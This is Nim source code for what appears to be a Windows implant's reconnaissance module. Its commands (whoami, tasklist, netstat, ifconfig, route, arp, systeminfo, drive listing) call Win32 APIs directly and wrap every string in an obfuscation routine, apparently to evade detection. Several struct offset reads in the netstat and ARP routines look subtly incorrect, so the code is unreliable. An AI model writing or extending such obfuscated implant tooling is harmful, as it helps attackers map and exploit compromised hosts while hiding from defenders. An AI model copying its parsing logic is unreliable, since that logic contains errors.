import std/strutils
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import execution/core
import filesystem

type Wchar = uint16

const
  hkeyLocalMachine = cast[pointer](0x80000002'u32)
  keyRead = 0x20019'u32
  computerNameDnsHostname = 1'u32
  computerNameDnsDomain = 2'u32
  afInet = 2'u32
  tcpTableOwnerPidAll = 5'u32
  udpTableOwnerPid = 1'u32
  errorInsufficientBuffer = 122'u32
  driveUnknown = 0'u32
  driveNoRootDir = 1'u32
  driveRemovable = 2'u32
  driveFixed = 3'u32
  driveRemote = 4'u32
  driveCdrom = 5'u32
  driveRamdisk = 6'u32
  addrNextOff = 8
  addrSockaddrOff = 16
  addrSockaddrLenOff = 24

type
  MemoryStatusEx = object
    dwLength: uint32
    dwMemoryLoad: uint32
    ullTotalPhys, ullAvailPhys: uint64
    ullTotalPageFile, ullAvailPageFile: uint64
    ullTotalVirtual, ullAvailVirtual: uint64
    ullAvailExtendedVirtual: uint64

  SystemInfo = object
    wProcessorArchitecture: uint16
    wReserved: uint16
    dwPageSize: uint32
    lpMinimumApplicationAddress: pointer
    lpMaximumApplicationAddress: pointer
    dwActiveProcessorMask: uint64
    dwNumberOfProcessors: uint32
    dwProcessorType: uint32
    dwAllocationGranularity: uint32
    wProcessorLevel: uint16
    wProcessorRevision: uint16

  ProcessEntry32W = object
    dwSize: uint32
    cntUsage: uint32
    th32ProcessID: uint32
    th32DefaultHeapID: uint64
    th32ModuleID: uint32
    cntThreads: uint32
    th32ParentProcessID: uint32
    pcPriClassBase: int32
    dwFlags: uint32
    szExeFile: array[260, uint16]

proc ipv4ToStr(ipAddr: uint32): string =
  # Converts an ipv4 address into text
  $(ipAddr and 0xFF) & obf(".") &
  $((ipAddr shr 8) and 0xFF) & obf(".") &
  $((ipAddr shr 16) and 0xFF) & obf(".") &
  $((ipAddr shr 24) and 0xFF)

proc portBeToHost(p: uint32): int =
  # Converts a big endian port into host order
  int((p shr 8) or ((p and 0xFF) shl 8))

proc regQueryString(subKey, valueName: string): string =
  # Reads a string value from the registry
  var wSub: array[512, Wchar]
  var wVal: array[128, Wchar]
  asciiWide(subKey, wSub)
  asciiWide(valueName, wVal)
  var hKey: pointer
  if regOpenKeyExW(hkeyLocalMachine, addr wSub[0], 0, keyRead, addr hKey) != 0:
    return ""
  defer: discard regCloseKey(hKey)
  var typ: culong = 0
  var need: culong = 0
  if regQueryValueExW(hKey, addr wVal[0], nil, addr typ, nil, addr need) != 0 or need == 0:
    return ""
  var data = newSeq[byte](need)
  if regQueryValueExW(hKey, addr wVal[0], nil, addr typ, addr data[0], addr need) != 0:
    return ""
  if typ == 1 or typ == 2:
    return wideToAscii(addr data[0], need)
  if typ == 4 and data.len >= 4:
    return $cast[ptr uint32](addr data[0])[]
  ""

proc driveTypeName(t: culong): string =
  # Returns the name of a drive type
  case t
  of driveRemovable: obf("Removable")
  of driveFixed: obf("Fixed")
  of driveRemote: obf("Remote")
  of driveCdrom: obf("CD-ROM")
  of driveRamdisk: obf("RAM disk")
  of driveNoRootDir: obf("No root")
  else: obf("Unknown")

proc appendLine(body: var string; line: string) =
  # Appends a line and keeps a trailing newline
  body.add line
  if not line.endsWith('\n'): body.add '\n'

proc readSockaddrIn(sa: pointer): (string, int) =
  # Reads an ipv4 address and port from a sockaddr
  if sa == nil: return ("", 0)
  let family = cast[ptr uint16](sa)[]
  if family != 2: return ("", 0)
  let ipAddr = cast[ptr uint32](cast[int](sa) + 4)[]
  let port = cast[ptr uint16](cast[int](sa) + 2)[]
  (ipv4ToStr(ipAddr), int(port))

proc walkUnicastAddresses(first: pointer): seq[string] =
  # Walks unicast addresses and collects ipv4 values
  var cur = first
  while cur != nil:
    let next = cast[ptr pointer](cast[int](cur) + addrNextOff)[]
    let sa = cast[ptr pointer](cast[int](cur) + addrSockaddrOff)[]
    let saLen = cast[ptr int32](cast[int](cur) + addrSockaddrLenOff)[]
    if sa != nil and saLen >= 16:
      let (ip, _) = readSockaddrIn(sa)
      if ip.len > 0 and ip != obf("0.0.0.0"):
        result.add ip
    cur = next

proc walkDnsAddresses(first: pointer): seq[string] =
  # Walks dns addresses and collects ipv4 values
  var cur = first
  while cur != nil:
    let next = cast[ptr pointer](cast[int](cur) + addrNextOff)[]
    let sa = cast[ptr pointer](cast[int](cur) + addrSockaddrOff)[]
    let saLen = cast[ptr int32](cast[int](cur) + addrSockaddrLenOff)[]
    if sa != nil and saLen >= 16:
      let (ip, _) = readSockaddrIn(sa)
      if ip.len > 0:
        result.add ip
    cur = next

proc run_whoami*(buf: var openArray[char]): int =
  # Builds the current user identity
  var userW: array[256, Wchar]
  var userLen = culong(userW.len)
  if getUserNameW(addr userW[0], addr userLen) == 0:
    return writeErr(obf("GetUserNameW failed"), buf)
  let user = wideToAscii(addr userW[0], culong((userLen + 1) * 2))
  var domainW: array[256, Wchar]
  var domainLen = culong(domainW.len)
  var who = user
  if getComputerNameExW(computerNameDnsDomain, addr domainW[0], addr domainLen) != 0 and domainLen > 0:
    let domain = wideToAscii(addr domainW[0], culong(domainLen * 2))
    if domain.len > 0:
      who = domain & obf("\\") & user
  else:
    var hostW: array[256, Wchar]
    var hostLen = culong(hostW.len)
    if getComputerNameExW(computerNameDnsHostname, addr hostW[0], addr hostLen) != 0 and hostLen > 0:
      let host = wideToAscii(addr hostW[0], culong(hostLen * 2))
      if host.len > 0:
        who = host & obf("\\") & user
  writeMsg(who, buf)

proc run_env*(buf: var openArray[char]): int =
  # Writes the current environment
  filesystem.run_set("", buf)

proc run_tasklist*(args: string; buf: var openArray[char]): int =
  # Lists the running processes
  discard args
  const th32CsSnapProcess = 0x00000002'u32
  const invalidHandle = cast[pointer](-1)
  let hSnap = createToolhelp32Snapshot(th32CsSnapProcess, 0)
  if hSnap == invalidHandle:
    return writeErr(obf("CreateToolhelp32Snapshot failed"), buf)
  defer: discard closeHandle(hSnap)
  var entry: ProcessEntry32W
  entry.dwSize = uint32(sizeof(ProcessEntry32W))
  if process32FirstW(hSnap, addr entry) == 0:
    return writeErr(obf("Process32FirstW failed"), buf)
  var body = obf("Image Name                       PID\n")
  body.add obf("================================ ========\n")
  while true:
    let name = wideToAscii(addr entry.szExeFile[0], culong(sizeof(entry.szExeFile)))
    var line = name
    while line.len < 33: line.add ' '
    line &= $entry.th32ProcessID
    appendLine(body, line)
    if process32NextW(hSnap, addr entry) == 0: break
  writeMsg(body, buf)

proc run_enumdrives*(buf: var openArray[char]): int =
  # Lists logical drives and their types
  var drives: array[512, Wchar]
  let n = getLogicalDriveStringsW(culong(drives.len), addr drives[0])
  if n == 0:
    return writeErr(obf("GetLogicalDriveStringsW failed"), buf)
  var body = ""
  var i = 0
  while i < int(n):
    var driveW: array[8, Wchar]
    var j = 0
    while drives[i + j] != 0'u16 and j < driveW.len - 1:
      driveW[j] = drives[i + j]; inc j
    if j >= 2:
      driveW[j] = 0'u16
      var drive: array[8, char]
      let dl = wtoa(driveW, drive)
      if dl <= 0:
        i += j + 1
        continue
      var root = newString(dl)
      copyMem(addr root[0], addr drive[0], dl)
      var wroot: array[8, Wchar]
      asciiWide(root, wroot)
      let dtype = getDriveTypeW(addr wroot[0])
      appendLine(body, root & obf(" [") & driveTypeName(dtype) & obf("]"))
    i += j + 1
  writeMsg(body, buf)

proc run_ifconfig*(buf: var openArray[char]): int =
  # Lists network adapters and their addresses
  var host: array[256, Wchar]
  var hostLen = culong(host.len)
  var hostname = obf("<unknown>")
  if getComputerNameExW(computerNameDnsHostname, addr host[0], addr hostLen) != 0:
    hostname = wideToAscii(addr host[0], culong(hostLen * 2))
  var size: culong = 0
  discard getAdaptersAddresses(0, 0, nil, nil, addr size)
  if size == 0:
    return writeErr(obf("GetAdaptersAddresses sizing failed"), buf)
  var data = newSeq[byte](size)
  if getAdaptersAddresses(0, 0, nil, addr data[0], addr size) != 0:
    return writeErr(obf("GetAdaptersAddresses failed"), buf)
  var body = obf("Hostname: ") & hostname & "\n\n"
  var cur = cast[pointer](addr data[0])
  while cur != nil:
    let friendly = cast[ptr pointer](cast[int](cur) + 72)[]
    let unicast = cast[ptr pointer](cast[int](cur) + 24)[]
    let dns = cast[ptr pointer](cast[int](cur) + 48)[]
    var name = obf("<adapter>")
    if friendly != nil:
      name = wideToAscii(friendly, 512)
    appendLine(body, obf("Adapter: ") & name)
    for ip in walkUnicastAddresses(unicast):
      appendLine(body, obf("  IPv4: ") & ip)
    let dnsList = walkDnsAddresses(dns)
    if dnsList.len > 0:
      appendLine(body, obf("  DNS : ") & dnsList.join(", "))
    body.add '\n'
    cur = cast[ptr pointer](cast[int](cur) + 8)[]
  writeMsg(body, buf)

proc run_route*(buf: var openArray[char]): int =
  # Lists the ipv4 routing table
  var size: culong = 0
  if getIpForwardTable(nil, addr size, 1) != errorInsufficientBuffer:
    return writeErr(obf("GetIpForwardTable sizing failed"), buf)
  var data = newSeq[byte](size)
  if getIpForwardTable(addr data[0], addr size, 1) != 0:
    return writeErr(obf("GetIpForwardTable failed"), buf)
  let count = cast[ptr culong](addr data[0])[]
  const rowSize = 32
  var body = obf("Destination        Netmask            Gateway            Metric\n")
  body.add obf("================== ================== ================== ======\n")
  for i in 0 ..< int(count):
    let base = cast[int](addr data[0]) + 4 + i * rowSize
    let dest = cast[ptr culong](base)[]
    let mask = cast[ptr culong](base + 4)[]
    let nextHop = cast[ptr culong](base + 12)[]
    let metric = cast[ptr culong](base + 24)[]
    let line = ipv4ToStr(uint32(dest)).align(18) & ipv4ToStr(uint32(mask)).align(19) &
      ipv4ToStr(uint32(nextHop)).align(19) & $metric
    appendLine(body, line)
  writeMsg(body, buf)

proc run_arp*(buf: var openArray[char]): int =
  # Lists the arp cache
  var size: culong = 0
  if getIpNetTable(nil, addr size, 1) != errorInsufficientBuffer:
    return writeErr(obf("GetIpNetTable sizing failed"), buf)
  var data = newSeq[byte](size)
  if getIpNetTable(addr data[0], addr size, 1) != 0:
    return writeErr(obf("GetIpNetTable failed"), buf)
  let count = cast[ptr culong](addr data[0])[]
  const rowSize = 24
  var body = obf("Interface          Physical Address   Type\n")
  body.add obf("================== ================== ======\n")
  for i in 0 ..< int(count):
    let base = cast[int](addr data[0]) + 4 + i * rowSize
    let ifIndex = cast[ptr culong](base)[]
    let physLen = cast[ptr culong](base + 4)[]
    let ipAddrVal = cast[ptr culong](base + 8)[]
    let typ = cast[ptr culong](base + 20)[]
    if physLen != 6: continue
    let mac = cast[ptr UncheckedArray[byte]](base + 12)
    var macStr = ""
    for j in 0 ..< 6:
      if j > 0: macStr.add '-'
      macStr.add toHex(int(mac[j]), 2)
    let line = ($ifIndex).align(18) & macStr.align(19) & $typ
    appendLine(body, line)
    discard ipAddrVal
  writeMsg(body, buf)

proc run_netstat*(args: string; buf: var openArray[char]): int =
  # Lists tcp and udp connections
  let filter = args.strip().toUpperAscii()
  var body = ""
  if filter.len == 0 or filter == obf("TCP"):
    var size: culong = 0
    discard getExtendedTcpTable(nil, addr size, 1, afInet, tcpTableOwnerPidAll, 0)
    if size > 0:
      var data = newSeq[byte](size)
      if getExtendedTcpTable(addr data[0], addr size, 1, afInet, tcpTableOwnerPidAll, 0) == 0:
        let count = cast[ptr culong](addr data[0])[]
        const rowSize = 24
        appendLine(body, obf("Proto  Local Address          Foreign Address        State   PID"))
        for i in 0 ..< int(count):
          let base = cast[int](addr data[0]) + 4 + i * rowSize
          let state = cast[ptr culong](base + 4)[]
          let localAddr = cast[ptr culong](base + 8)[]
          let localPort = cast[ptr culong](base + 12)[]
          let remoteAddr = cast[ptr culong](base + 16)[]
          let remotePort = cast[ptr culong](base + 20)[]
          let pid = cast[ptr culong](base + 24)[]
          let local = ipv4ToStr(uint32(localAddr)) & obf(":") & $portBeToHost(uint32(localPort))
          let remote = ipv4ToStr(uint32(remoteAddr)) & obf(":") & $portBeToHost(uint32(remotePort))
          appendLine(body, obf("TCP    ") & local.align(23) & remote.align(24) &
            ($state).align(8) & $pid)
  if filter.len == 0 or filter == obf("UDP"):
    var size: culong = 0
    discard getExtendedUdpTable(nil, addr size, 1, afInet, udpTableOwnerPid, 0)
    if size > 0:
      var data = newSeq[byte](size)
      if getExtendedUdpTable(addr data[0], addr size, 1, afInet, udpTableOwnerPid, 0) == 0:
        let count = cast[ptr culong](addr data[0])[]
        const rowSize = 12
        if body.len == 0:
          appendLine(body, obf("Proto  Local Address          PID"))
        for i in 0 ..< int(count):
          let base = cast[int](addr data[0]) + 4 + i * rowSize
          let localAddr = cast[ptr culong](base + 4)[]
          let localPort = cast[ptr culong](base + 8)[]
          let pid = cast[ptr culong](base + 12)[]
          let local = ipv4ToStr(uint32(localAddr)) & obf(":") & $portBeToHost(uint32(localPort))
          appendLine(body, obf("UDP    ") & local.align(23) & $pid)
  if body.len == 0:
    return writeMsg(obf("No connections found"), buf)
  writeMsg(body, buf)

proc run_systeminfo*(buf: var openArray[char]): int =
  # Builds a short system information report
  var host: array[256, Wchar]
  var hostLen = culong(host.len)
  var hostname = obf("<unknown>")
  if getComputerNameExW(computerNameDnsHostname, addr host[0], addr hostLen) != 0:
    hostname = wideToAscii(addr host[0], culong(hostLen * 2))
  var si: SystemInfo
  getNativeSystemInfo(addr si)
  var mem: MemoryStatusEx
  mem.dwLength = uint32(sizeof(MemoryStatusEx))
  if globalMemoryStatusEx(addr mem) == 0:
    return writeErr(obf("GlobalMemoryStatusEx failed"), buf)
  let product = regQueryString(
    obf("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), obf("ProductName"))
  let build = regQueryString(
    obf("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), obf("CurrentBuild"))
  let display = regQueryString(
    obf("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), obf("DisplayVersion"))
  let arch = if si.wProcessorArchitecture == 9: obf("x64-based PC") else: obf("x86-based PC")
  let totalMb = int(mem.ullTotalPhys div (1024 * 1024))
  let availMb = int(mem.ullAvailPhys div (1024 * 1024))
  var body = ""
  appendLine(body, obf("Host Name:                 ") & hostname)
  appendLine(body, obf("OS Name:                   ") & product)
  if display.len > 0:
    appendLine(body, obf("OS Version:                ") & display & obf(" Build ") & build)
  else:
    appendLine(body, obf("OS Version:                Build ") & build)
  appendLine(body, obf("System Type:               ") & arch)
  appendLine(body, obf("Processor(s):              ") & $si.dwNumberOfProcessors)
  appendLine(body, obf("Total Physical Memory:     ") & $totalMb & obf(" MB"))
  appendLine(body, obf("Available Physical Memory: ") & $availMb & obf(" MB"))
  writeMsg(body, buf)
